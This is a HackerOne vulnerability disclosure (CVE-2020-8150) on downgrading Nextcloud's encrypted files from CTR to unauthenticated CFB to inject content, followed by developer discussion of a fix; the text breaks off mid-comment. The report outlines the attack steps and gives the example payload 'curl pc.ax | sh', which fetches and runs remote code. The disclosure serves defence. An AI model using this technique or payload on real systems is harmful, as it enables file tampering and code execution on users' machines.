{"id":742588,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDI1ODg=","url":"https://hackerone.com/reports/742588","title":"Downgrade encryption scheme and break integrity through known-plaintext attack","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-11-20T19:40:03.765Z","submitted_at":"2019-11-20T19:40:03.765Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yahe","url":"/yahe","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8150"],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-05T07:59:44.179Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-10-06T07:59:40.090Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The idea behind the Server Side Encryption is that you can move your encrypted files to an external party without that external party being able to to read or modify those files. Some time ago, Nextcloud switched from unauthenticated CFB cipher block mode to authenticated CTR cipher block mode in an Encrypt-then-MAC scheme. However, backends compatibility has been maintained while downgrade attacks have been prevented on new files that use the CTR cipher block mode [1].\n\nThere is, however, one attack vector that has not been taken into account. CFB/OFB and CTR generate the same keystream for the first round, creating the possibility for a known-plaintext attack to extract the first bytes of the keystream. Furthermore, the downgrade attack only prevents files from not having a \"signature\" (HMAC) when their file header contain a CTR cipher.  A downgrade is still possible when another mode like CFB/OFB is given in the file header.\n\nBecause of these two vulnerabilities, a downgrade attack in conjunction with a known-plaintext attack can be leveraged to break the integrity of files encrypted with Encrypt-then-MAC encryption scheme of Nextcloud using the newer AES-256-CTR cipher.\n\nIn the first step, you need access to an encrypted file (as an external storage provider would have). You do not need access to the encryption keys as this attack is directly mounted on the encrypted file itself. By using a tool (like `strip-signature.php` [2]), you can strip the signature elements from the content block footers and change the cipher in the file header from `AES-256-CTR` to `AES-256-CFB`. Nextcloud will happily decrypt this file, the first 16 bytes will be perfectly readable but the rest of the file will be gibberish.\n\nIn the second step, you need to know what the contents of the file will look like (known-plaintext attack). For Linux binaries this will be relative easy as the ELF file format has a predictable structure will little variation in the first 16 bytes of the file. The same holds true for Linux shell scripts that will probably have `#!/bin/bash\\n` as the first 12 of the 16 bytes preset. The same holds true for Python scripts, which will probably start with something like `#!/usr/bin/env python\\n` providing all the known-plaintext that the attacker will need. If you have enough knowledge about the inital content of the file you can just inject your target content into the encrypted file with the help of a little tool (like `inject-content.php` [3]).\n\nWith these two steps, the attacker successfully broke the integrity guarantees of the Nextcloud Server-Side Encryption and was able to inject malicious code into files that will probably be made executable by a user that has downloaded those files from the Nextcloud server. An injectable payload that fits in those 16 bytes might e.g. be `curl pc.ax | sh\\n` which downloads additional code (without length constraints) from an external source at executes the additional payload.\n\n[1] https://github.com/nextcloud/server/blob/a374d8837d6de459500e619cf608e0721ea14574/apps/encryption/lib/Crypto/Crypt.php#L571\n[2] https://github.com/syseleven/nextcloud-tools/blob/master/strip-signature.php\n[3] https://github.com/syseleven/nextcloud-tools/blob/master/inject-content.php\n\n## Impact\n\nAn attacker that has access to encrypted files that have been encrypted using the newest Encrypt-than-MAC encryption scheme with AES-256-CTR can be downgraded to unauthenticated AES-256-CFB encrypted files. Those downgraded files can then be injected with malicious content in the course of a known-plaintext attack (which is practically feasible as shown with ELF binaries, Python scripts, Bash scripts, etc.). Those injected binaries can then be used to further exploit the user.","vulnerability_information_html":"\u003cp\u003eThe idea behind the Server Side Encryption is that you can move your encrypted files to an external party without that external party being able to to read or modify those files. Some time ago, Nextcloud switched from unauthenticated CFB cipher block mode to authenticated CTR cipher block mode in an Encrypt-then-MAC scheme. However, backends compatibility has been maintained while downgrade attacks have been prevented on new files that use the CTR cipher block mode [1].\u003c/p\u003e\n\n\u003cp\u003eThere is, however, one attack vector that has not been taken into account. CFB/OFB and CTR generate the same keystream for the first round, creating the possibility for a known-plaintext attack to extract the first bytes of the keystream. Furthermore, the downgrade attack only prevents files from not having a \u0026quot;signature\u0026quot; (HMAC) when their file header contain a CTR cipher.  A downgrade is still possible when another mode like CFB/OFB is given in the file header.\u003c/p\u003e\n\n\u003cp\u003eBecause of these two vulnerabilities, a downgrade attack in conjunction with a known-plaintext attack can be leveraged to break the integrity of files encrypted with Encrypt-then-MAC encryption scheme of Nextcloud using the newer AES-256-CTR cipher.\u003c/p\u003e\n\n\u003cp\u003eIn the first step, you need access to an encrypted file (as an external storage provider would have). You do not need access to the encryption keys as this attack is directly mounted on the encrypted file itself. By using a tool (like \u003ccode\u003estrip-signature.php\u003c/code\u003e [2]), you can strip the signature elements from the content block footers and change the cipher in the file header from \u003ccode\u003eAES-256-CTR\u003c/code\u003e to \u003ccode\u003eAES-256-CFB\u003c/code\u003e. Nextcloud will happily decrypt this file, the first 16 bytes will be perfectly readable but the rest of the file will be gibberish.\u003c/p\u003e\n\n\u003cp\u003eIn the second step, you need to know what the contents of the file will look like (known-plaintext attack). For Linux binaries this will be relative easy as the ELF file format has a predictable structure will little variation in the first 16 bytes of the file. The same holds true for Linux shell scripts that will probably have \u003ccode\u003e#!/bin/bash\\n\u003c/code\u003e as the first 12 of the 16 bytes preset. The same holds true for Python scripts, which will probably start with something like \u003ccode\u003e#!/usr/bin/env python\\n\u003c/code\u003e providing all the known-plaintext that the attacker will need. If you have enough knowledge about the inital content of the file you can just inject your target content into the encrypted file with the help of a little tool (like \u003ccode\u003einject-content.php\u003c/code\u003e [3]).\u003c/p\u003e\n\n\u003cp\u003eWith these two steps, the attacker successfully broke the integrity guarantees of the Nextcloud Server-Side Encryption and was able to inject malicious code into files that will probably be made executable by a user that has downloaded those files from the Nextcloud server. An injectable payload that fits in those 16 bytes might e.g. be \u003ccode\u003ecurl pc.ax | sh\\n\u003c/code\u003e which downloads additional code (without length constraints) from an external source at executes the additional payload.\u003c/p\u003e\n\n\u003cp\u003e[1] \u003ca title=\"https://github.com/nextcloud/server/blob/a374d8837d6de459500e619cf608e0721ea14574/apps/encryption/lib/Crypto/Crypt.php#L571\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fblob%2Fa374d8837d6de459500e619cf608e0721ea14574%2Fapps%2Fencryption%2Flib%2FCrypto%2FCrypt.php%23L571\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/blob/a374d8837d6de459500e619cf608e0721ea14574/apps/encryption/lib/Crypto/Crypt.php#L571\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n[2] \u003ca title=\"https://github.com/syseleven/nextcloud-tools/blob/master/strip-signature.php\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fsyseleven%2Fnextcloud-tools%2Fblob%2Fmaster%2Fstrip-signature.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/syseleven/nextcloud-tools/blob/master/strip-signature.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n[3] \u003ca title=\"https://github.com/syseleven/nextcloud-tools/blob/master/inject-content.php\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fsyseleven%2Fnextcloud-tools%2Fblob%2Fmaster%2Finject-content.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/syseleven/nextcloud-tools/blob/master/inject-content.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker that has access to encrypted files that have been encrypted using the newest Encrypt-than-MAC encryption scheme with AES-256-CTR can be downgraded to unauthenticated AES-256-CFB encrypted files. Those downgraded files can then be injected with malicious content in the course of a known-plaintext attack (which is practically feasible as shown with ELF binaries, Python scripts, Bash scripts, etc.). Those injected binaries can then be used to further exploit the user.\u003c/p\u003e\n","weakness":{"id":32,"name":"Cryptographic Issues - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":639638,"file_name":"nextcloud_poc4.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ZnPWprhPVJAirKog574RmjPP?response-content-disposition=attachment%3B%20filename%3D%22nextcloud_poc4.mp4%22%3B%20filename%2A%3DUTF-8%27%27nextcloud_poc4.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064509Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=f5ebafd169ce2a00ffc3453b1ef09c0bb041e32795e9d6c01b1e172baba06dc4","file_size":7475178,"type":"video/mp4"}],"allow_singular_disclosure_at":"2020-11-05T07:59:40.165Z","allow_singular_disclosure_after":-4661129.428009991,"singular_disclosure_allowed":true,"vote_count":3,"voters":["demonia","helphen","dilawn"],"severity":{"rating":"medium","score":5.3,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":13,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/server","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6361703,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2019-11-20T19:40:04.045Z","updated_at":"2019-11-20T19:40:04.045Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6402944,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nSame here. Thanks for the reports :)\nI'll get back to you once I dove into the code again.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eSame here. Thanks for the reports :)\u003cbr\u003e\nI\u0026#39;ll get back to you once I dove into the code again.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-25T19:47:30.736Z","updated_at":"2019-11-25T19:47:30.736Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6480026,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-06T08:59:49.028Z","updated_at":"2019-12-06T08:59:49.028Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6501411,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I thought about how to solve this problem with a rather simple addition: You could introduce a setting that prevents Nextcloud from decrypting files that use the older blockcipher mode. This setting could default to `true` for all new installations while it is explicitly set to `false` when older instances get updated.\n\nAdmins of older instances could then check if they ever used the old blockcipher mode and if not they could switch to the default setting and effectively disable the support for the old blockcipher mode.","markdown_message":"\u003cp\u003eI thought about how to solve this problem with a rather simple addition: You could introduce a setting that prevents Nextcloud from decrypting files that use the older blockcipher mode. This setting could default to \u003ccode\u003etrue\u003c/code\u003e for all new installations while it is explicitly set to \u003ccode\u003efalse\u003c/code\u003e when older instances get updated.\u003c/p\u003e\n\n\u003cp\u003eAdmins of older instances could then check if they ever used the old blockcipher mode and if not they could switch to the default setting and effectively disable the support for the old blockcipher mode.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T09:54:55.578Z","updated_at":"2019-12-09T09:54:55.578Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6829010,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, I guess that now that Nextcloud 18 has been published there will be the time to look into the issues of the server-side encryption? My plan is to to submit a talk about the Nextcloud server-side encryption to the upcoming [Gulaschprogrammiernacht](https://entropia.de/GPN20) (May 21st to May 24th). This should be enough time to fix the issues.","markdown_message":"\u003cp\u003eHi, I guess that now that Nextcloud 18 has been published there will be the time to look into the issues of the server-side encryption? My plan is to to submit a talk about the Nextcloud server-side encryption to the upcoming \u003ca href=\"/redirect?url=https%3A%2F%2Fentropia.de%2FGPN20\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGulaschprogrammiernacht\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (May 21st to May 24th). This should be enough time to fix the issues.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-21T16:36:41.196Z","updated_at":"2020-01-21T16:36:41.196Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8123016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, this issue hasn't seen any update for 4 months. We approached the end of May without a fix. Do you still intend to work on this problem?","markdown_message":"\u003cp\u003eHello, this issue hasn\u0026#39;t seen any update for 4 months. We approached the end of May without a fix. Do you still intend to work on this problem?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-27T19:42:08.619Z","updated_at":"2020-05-27T19:42:08.619Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8145192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nYes this is still on our list but right now we don't have a good way to solve it.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eYes this is still on our list but right now we don\u0026#39;t have a good way to solve it.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-29T13:35:13.401Z","updated_at":"2020-05-29T13:35:13.401Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8913193,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nSo after long discussions we still have no very clean way forward.\nWhat we'll do now is have an upgrade step that for existing users enables the compatibility. (a setting in config.php). Then for new installations the backwards compatibility mode is just not enabled and this attack whill thus not work.\n\nThen the second step is providing a command to reencrypt all files and then after that disable the compatibility mode.\n\nOr would you have other suggestion that are maybe less invasive?\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eSo after long discussions we still have no very clean way forward.\u003cbr\u003e\nWhat we\u0026#39;ll do now is have an upgrade step that for existing users enables the compatibility. (a setting in config.php). Then for new installations the backwards compatibility mode is just not enabled and this attack whill thus not work.\u003c/p\u003e\n\n\u003cp\u003eThen the second step is providing a command to reencrypt all files and then after that disable the compatibility mode.\u003c/p\u003e\n\n\u003cp\u003eOr would you have other suggestion that are maybe less invasive?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T08:05:03.351Z","updated_at":"2020-08-12T08:05:03.351Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8913373,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Unfortunately, I don't see a less invasive approach for people that still have legacy files.\n\nWhat would be helpful is a tool that checks if those legacy files exist. E.g., in our case we're pretty certain that we could disable the compatibility right away. Others might need re-assurance that they can protect themselves by just disabling the compatibility as well.","markdown_message":"\u003cp\u003eUnfortunately, I don\u0026#39;t see a less invasive approach for people that still have legacy files.\u003c/p\u003e\n\n\u003cp\u003eWhat would be helpful is a tool that checks if those legacy files exist. E.g., in our case we\u0026#39;re pretty certain that we could disable the compatibility right away. Others might need re-assurance that they can protect themselves by just disabling the compatibility as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T08:27:23.937Z","updated_at":"2020-08-12T08:27:23.937Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8913642,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nOk thanks for verifying.\nTHen let me do the approach in steps.\n\n1. Will be a PR that duriung upgrades enables the legacy compatibility mode. Users can then disable it themselves easily if they know they recently installed Nextcloud and thus have no need for this.\n\n2. I'll try to come up with a occ command to check for those files. So you can easily run it. And it reports if you have such files. If you do not then you can also just remove it.\n\n3. I'll try to think of a way to reencrypt those files easily. But I'm not sure if we can do that. Especially if user-keys are used since then we need the users password. But 2 should already help a lot.\n\nI'll link you the PRs for reverence (and a qucik review if you have the time).\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eOk thanks for verifying.\u003cbr\u003e\nTHen let me do the approach in steps.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eWill be a PR that duriung upgrades enables the legacy compatibility mode. Users can then disable it themselves easily if they know they recently installed Nextcloud and thus have no need for this.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eI\u0026#39;ll try to come up with a occ command to check for those files. So you can easily run it. And it reports if you have such files. If you do not then you can also just remove it.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eI\u0026#39;ll try to think of a way to reencrypt those files easily. But I\u0026#39;m not sure if we can do that. Especially if user-keys are used since then we need the users password. But 2 should already help a lot.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI\u0026#39;ll link you the PRs for reverence (and a qucik review if you have the time).\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T08:34:01.438Z","updated_at":"2020-08-12T08:34:01.438Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8913738,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Btw., so you have heard that: IMHO the best approach would be if the file header would be integrity-protected as well. Given that the file headers contain about 8k of padding characters there should be enough space for a MAC. However, introducing authenticated headers would also be an invasive step for people who don't have legacy files so being able to disable the support for them is a good (and easy to implement and roll out) first step.","markdown_message":"\u003cp\u003eBtw., so you have heard that: IMHO the best approach would be if the file header would be integrity-protected as well. Given that the file headers contain about 8k of padding characters there should be enough space for a MAC. However, introducing authenticated headers would also be an invasive step for people who don\u0026#39;t have legacy files so being able to disable the support for them is a good (and easy to implement and roll out) first step.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T08:37:13.515Z","updated_at":"2020-08-12T08:38:22.887Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8913844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nYes this came up here as well. But indeed lets take small steps.\nBut thanks for sharing.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eYes this came up here as well. But indeed lets take small steps.\u003cbr\u003e\nBut thanks for sharing.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T08:47:13.338Z","updated_at":"2020-08-12T08:47:13.338Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8915390,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nSo for the first part we started with: https://github.com/nextcloud/server/pull/22218/files\nBasically if you remove the config setting after upgrade it will just refuse to use the legacy cipher. Meaning that if no header is set getting the cipher will result in an error. And then things just fail hard.\n\nI'm doing the steps you wrote down earlier. But if You'd have the chance to also verify them that would be most appreciated.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eSo for the first part we started with: \u003ca title=\"https://github.com/nextcloud/server/pull/22218/files\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fpull%2F22218%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/pull/22218/files\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nBasically if you remove the config setting after upgrade it will just refuse to use the legacy cipher. Meaning that if no header is set getting the cipher will result in an error. And then things just fail hard.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m doing the steps you wrote down earlier. But if You\u0026#39;d have the chance to also verify them that would be most appreciated.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T11:44:15.810Z","updated_at":"2020-08-12T11:44:15.810Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8915854,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I don't think that the current version fixes the problem. The current version only seems to prevent that the encrypted private key is not downgraded to a legacy cipher (which is actually a finding of its own, so, well done).\n\nThe problem I've found lies in [here](https://github.com/nextcloud/server/blob/6cd654a6ced0219b3c7c9c300142ba2557f8559f/apps/encryption/lib/Crypto/Crypt.php#L584). You can circumvent the integrity check if you set the cipher header to something that doesn't contain `'ctr'`. That's a circumvention that should not be allowed. This is where you can open up a known-plaintext attack be stripping the signature from the encrypted file. When the legacy support is disabled then all 